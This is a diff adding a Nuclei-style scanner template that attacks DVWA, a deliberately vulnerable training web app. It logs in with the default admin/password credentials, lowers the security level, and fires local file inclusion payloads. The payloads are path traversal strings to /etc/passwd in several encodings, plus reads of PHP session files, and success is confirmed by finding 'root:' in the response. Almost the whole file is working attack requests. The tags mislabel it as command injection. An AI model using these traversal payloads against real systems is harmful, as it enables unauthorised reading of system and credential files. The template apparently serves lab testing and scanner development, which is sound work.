@@ -1,0 +1,126 @@
+id: dvwa-local-file-inclusion-low-sec 
+
+info:
+  name: DVWA Local File Inclustion - low sec (Authenticated)
+  author: Shieldia
+  severity: high
+  description: Attempts to exploit LFI on DVWA after authentication.
+  reference:
+    - https://github.com/digininja/DVWA
+  tags: dvwa,auth,command-injection
+
+variables:
+  password: "password"
+  username: "admin"
+  payloads:
+    - "../../../../../../../etc/passwd"
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    - "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+    - "Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=="
+    - "%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd"
+    - "../../../../../../../etc/passwd%00"
+  sess_payloads:
+    - "../../../../../../../var/lib/php/sessions/sess_"
+
+flow: |
+  http(1) && http(2);
+  for (let sess_payload of iterate(template["sess_payloads"])) {
+    set("sess_payload", sess_payload);
+    http(3);
+  }
+  for (let payload of iterate(template["payloads"])) {
+    set("payload", payload);
+    http(4);
+  }
+
+http:
+  # Step 1: Authenticate as admin and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
+    
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+  # Step 2: Set Security Level to Low
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=low&seclev_submit=Submit&user_token={{token}}
+
+    extractors:  
+      - type: regex
+        name: phpsessid
+        group: 1
+        part: header
+        regex:
+          - "PHPSESSID=([a-z0-9]{26})"
+        internal: true
+
+  # Step 3: Attempt Local File Include for session file
+  - raw:
+      - |
+        GET /DVWA/vulnerabilities/fi/?page={{sess_payload}}{{phpsessid}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        name: "Successful Session LFI attempt"
+        condition: and
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "{{token}}")'
+    extractors:
+      - type: regex
+        name: session_content
+        part: body
+        group: 1
+        regex:
+          - "^(dvwa\\|.*);" 
+
+  # Step 4: Execute Local File Inclustion
+  - raw:
+      - |
+        GET /DVWA/vulnerabilities/fi/?page={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: dsl
+        name: "Successful LFI attempt"
+        condition: and
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "root:")'
+    extractors:
+      - type: dsl
+        name: session_content
+        dsl:
+          - "payload"
